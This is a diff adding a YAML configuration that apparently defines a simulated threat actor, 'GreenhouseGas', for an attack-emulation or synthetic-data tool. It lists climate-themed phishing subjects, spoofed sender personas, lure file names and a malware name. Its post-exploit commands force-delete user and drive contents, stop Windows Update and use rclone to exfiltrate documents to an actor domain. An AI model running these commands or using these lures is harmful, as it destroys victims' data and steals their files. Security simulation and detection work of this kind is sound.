@@ -1,0 +1,64 @@
+name: GreenhouseGas
+effectiveness: 80
+count_init_passive_dns: 10
+max_wave_size: 3
+attacks:
+  - recon:browsing
+  - watering_hole:phishing
+  - email:malware_delivery
+domain_themes:
+  - climate 
+  - sustainability
+  - innovation
+  - energy
+  - environmental 
+  - green 
+sender_themes:
+  - environmentalist
+  - sustainability expert
+  - green energy advocate
+  - climate scientist
+  - policy researcher
+subjects:
+  - "Join our climate change policy network"
+  - "Sustainability report for your business"
+  - "Invitation to climate change policy symposium"
+  - "Climate change research funding opportunity"
+  - "Green energy policy recommendations for your organization"
+recon_search_terms:
+  - carbon offsetting scheme
+  - renewable energy policies
+  - climate change adaptation strategies
+  - sustainability reports
+  - green economy initiatives
+  - environmental policy papers
+file_names:
+  - sustainability-report.docx
+  - green-energy-policy.pdf
+  - climate-change-adaptation.docx
+  - carbon-offsetting-scheme.pdf
+  - environmental-policy-paper.docx
+  - funding-application-form.docx
+  - climate-policy-symposium-agenda.docx
+  - research-proposal-template.docx
+tlds:
+  - com
+  - org
+spoofs_email: True
+malware:
+  - eco-disaster
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe del /F /S /Q "C:\Users\*.*"
+  - name: cmd.exe
+    process: "cmd.exe dir D:\\ /S /Q"
+  - name: cmd.exe
+    process: "cmd.exe del /F /S /Q D:\\*.*"
+  - name: cmd.exe
+    process: "cmd.exe dir E:\\ /S /Q"
+  - name: cmd.exe
+    process: "cmd.exe del /F /S /Q E:\\*.*"
+  - name: cmd.exe
+    process: "cmd.exe powershell.exe Stop-Service wuauserv"
+  - name: rclone.exe 
+    process: 'rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" {actor_domain}'
